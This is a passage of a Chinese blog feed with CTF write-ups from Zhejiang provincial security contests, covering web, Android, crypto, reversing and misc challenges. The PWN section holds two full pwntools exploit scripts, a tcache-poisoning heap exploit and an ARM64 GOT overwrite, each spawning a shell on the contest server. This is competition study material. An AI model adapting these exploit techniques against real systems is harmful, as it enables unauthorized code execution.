<span class="hljs-number">0</span>).show();<br>    MainActivity.<span class="hljs-built_in">this</span>.startActivity(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(MainActivity.<span class="hljs-built_in">this</span>, afterlclass));<br>&#125;<br></code></pre></td></tr></table></figure><p>加密函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; <span class="hljs-title function_">change</span><span class="hljs-params">(String args)</span> &#123;<br>    <span class="hljs-type">char</span>[] ch;<br>    List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : args.toCharArray()) &#123;<br>        list.add(Integer.valueOf((c ^ <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure><p>用户名明文存储，是<code>ccadwjlyah</code></p><p>程序会对输入后的密码加密然后与程序中的<code>compare</code>变量比较</p><p>获取<code>compare</code>数组的值，其中有一个成员存储在变量中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-2.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((i&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到密码<code>f4n_4ndro1d</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-1.png"></p><p>赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>因为加密代码<code>(str.index(i)*key+7)%37</code>中取余了37，所以key的值可以认为在0~37的范围内</p><p>直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br>s=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    e=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>            <span class="hljs-keyword">if</span> s[((j*i)+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span>]==a[n]:<br>                e=e+s[j]<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-math-1.png"></p><p>flag: <code>799a03b7a82076f5028059681df1b722</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;二战浙江省赛，混了个二等奖。感觉预赛题目都比决赛题目出的好&lt;/p&gt;
&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;ezphp&quot;&gt;&lt;a href=&quot;#ezphp&quot; </summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="浙江" scheme="https://www.lewiserii.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛初赛-WP</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-wp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-wp.html</id>
    <published>2022-09-17T09:00:00.000Z</published>
    <updated>2022-09-29T08:35:30.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>Rml</p><p>Rank: 32</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nisc-easyweb"><a href="#nisc-easyweb" class="headerlink" title="nisc_easyweb"></a>nisc_easyweb</h3><p>访问<code>/robots.txt</code>，发现<code>/api/record</code>，访问后到<code>/test_api.php</code>，F12得到<code>i=FlagInHere</code>，按题目要求get传参拿到flag</p><h3 id="nisc-学校门户网站"><a href="#nisc-学校门户网站" class="headerlink" title="nisc_学校门户网站"></a>nisc_学校门户网站</h3><p>访问学生系统，任意注册一个用户进入系统拿到flag</p><h3 id="吃豆人吃豆魂"><a href="#吃豆人吃豆魂" class="headerlink" title="吃豆人吃豆魂"></a>吃豆人吃豆魂</h3><p>在index.js中搜到失败返回值，成功返回值就在上一行</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-web3-1.png"></p><p>base64解密拿到flag</p><p><code>REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==</code></p><p><code>DASCTF&#123;f235b02382a223fda4ce2ec62148d94c&#125;</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>因为程序存在<code>uaf</code>，所以连续释放两个<code>chunk</code>，可以获取<code>heap段地址</code>，这样可以计算出<code>tcache bin</code>的地址</p><p>通过覆盖<code>tcache bin</code>的值，在任意地址放置<code>chunk</code>，设置<code>chunk0</code>的<code>size</code>为<code>0x430</code>，并在<code>chunk0+0x430</code>的位置处构造两个<code>0x20</code>字节的<code>chunk</code> 释放<code>chunk0</code>，获取<code>libc</code>地址，再利用<code>tcache bin</code>，可以以最少的<code>chunk</code>数，在<code>free_hook</code>中写入<code>system</code>函数地址</p><p>再次执行<code>free</code>函数调用<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;27188&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./babyheap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn1-1.png"></p><h3 id="new-stack"><a href="#new-stack" class="headerlink" title="new_stack"></a>new_stack</h3><p><em>赛后复现</em></p><p><code>main</code>函数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-1.png"></p><p>后门函数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-2.png"></p><p>后门函数会将我们输入的数据写入栈中，刚好最后<code>8字节</code>可以修改<code>X29寄存器</code>的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改<code>X0寄存器</code>，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改<code>got表</code>控制程序流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;10.201.15.180&#x27;</span>,<span class="hljs-number">4444</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(puts))<br><span class="hljs-comment"># 因为正常输出会输出puts函数对应got表项中的数值</span><br><span class="hljs-comment"># 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址</span><br><span class="hljs-comment"># 可以用来获取libc地址</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值</span><br><span class="hljs-comment"># 并将puts函数设置为system</span><br><span class="hljs-comment"># 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-3.png"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h3><p>程序在<code>check1</code>中会检测输入是否等于77</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-1.jpg"></p><p>在<code>check2</code>中输入的第一个数字的平方要等于3025，第二个数的平方要等于2401</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-2.jpg"></p><p>根据<code>reshort16</code>函数得知，将<code>check3</code>输入的数字的高两个字节和低两个字节调换位置后要等于<code>0x66744769</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-4.jpg"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-3.jpg"></p><p>按要求输入完四个数字拿到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-5.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h3><p>先将文件反转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fuck.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br><br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><code>flag.png</code>少了文件头，补上<code>89 50 4e 47</code></p><p>crc报错，修改下高度拿到flag</p><h3 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h3><p><em>赛后复现</em></p><p>lsb查看0通道，发现一串加密字符，base32解密得到<code>LastKey&#123;Yusayyds&#125;</code></p><p>首先是波利比奥斯方阵密码</p><p>手搓或者脚本</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51&#x27;</span><br>a=a.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>t=<span class="hljs-string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span><br>n=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    n=n+t[(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])-<span class="hljs-number">1</span>)*<span class="hljs-number">5</span>+<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-1.png"></p><p>得到<code>AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV</code></p><p>加上key解<code>ADFGVX</code>密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-2.png"></p><p><code>4441534354467b64383539633431633533306166633163316164393461626439326634626166387d</code></p><p>十六进制转字符串得到flag</p><h3 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h3><p><em>赛后复现</em></p><p>文件很小，直接crc爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-1.png"></p><p>得到解压密码<code>gZinflAte_BasE64</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-2.png"></p><p>追踪流，发现<code>sa066b32bfb3e7</code>的值在传递<code>zip</code>文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-3.png"></p><p>tshark提取出来</p><p><code>tshark -r segmentFlow.pcapng -Y &quot;http.request&quot; -T fields -e http.file_data &gt; data.txt</code></p><p>提取压缩包部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>data=f.read()<br>data=data.split(<span class="hljs-string">&#x27;&amp;sa066b32bfb3e7=&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(data[i][:<span class="hljs-number">8</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>.fromhex(data[i][:<span class="hljs-number">8</span>]))<br></code></pre></td></tr></table></figure><p>解压得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;战队信息&quot;&gt;&lt;a href=&quot;#战队信息&quot; class=&quot;headerlink&quot; title=&quot;战队信息&quot;&gt;&lt;/a&gt;战队信息&lt;/h1&gt;&lt;p&gt;Rml&lt;/p&gt;
&lt;p&gt;Rank: 32&lt;/p&gt;
&lt;h1 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;h</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="浙江" scheme="https://www.lewiserii.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
</feed>
